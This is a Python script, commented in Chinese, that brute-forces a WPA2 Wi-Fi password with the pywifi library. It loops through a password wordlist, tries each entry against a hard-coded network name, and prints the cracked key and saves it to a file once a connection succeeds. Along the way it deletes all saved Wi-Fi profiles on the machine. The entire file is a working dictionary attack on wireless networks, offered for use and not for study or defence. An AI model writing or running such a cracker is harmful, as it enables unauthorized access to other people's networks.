import pywifi
from pywifi import const    #获取连接状态的常量库
import time

# 测试链接，返回连接结果
def wifiConnect(ifaces,pwd):

    # 断开网卡连接
    ifaces.disconnect()
    time.sleep(1)
    # 获取wifi的连接状态
    wifistatus = ifaces.status()
    # 网卡断开链接后开始连接测试
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建wifi连接文件
        profile =  pywifi.Profile()
        # 要连接的wifi的名称  貌似不能用中文？
        profile.ssid = WIFIname
        # 网卡的开放状态 | auth - AP的认证算法
        profile.auth = const.AUTH_ALG_OPEN
        # wifi的加密算法，一般wifi 加密算法时wps  #选择wifi加密方式  akm - AP的密钥管理类型
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元 /cipher - AP的密码类型
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码 /wifi密钥 如果无密码，则应该设置此项CIPHER_TYPE_NONE
        profile.key = pwd
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 加载新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(2)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")

# 读取密码本
def readPassword():
    print("开始破解：")
    # 密码本路径
    # 打开文件
    f = open(DicPath,"r")
    while True:
        try:
            # 一行一行读取
            password = f.readline()
            password = password[:-1]  # 去除一行末的换行符
            bool = wifiConnect(ifaces,password)
            if bool:
                print("密码已破解：",password)
                print("wifi已连接！")
                # ifaces.network_profiles()  # 你连接上wifi的时候可以用这个试试，会返回你连接的wifi的信息
                fw = open("password.txt", "w",
                         encoding='utf-8')
                fw.write(WIFIname+"  "+password)
                fw.close()  # 关闭文件
                f.close()
                break
            else:
                print("密码破解中，密码校对：",password)
            if not password:
                print('文件已读取完，退出。')
                f.close()
                break
        except:
            # continue
            print("error")

if __name__ == '__main__':
    WIFIname =  'Tenda_401'
    DicPath = "other-1.txt"
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # print(ifaces)
    # 获取电脑无线网卡的名称
    # print(ifaces.name())
    readPassword()
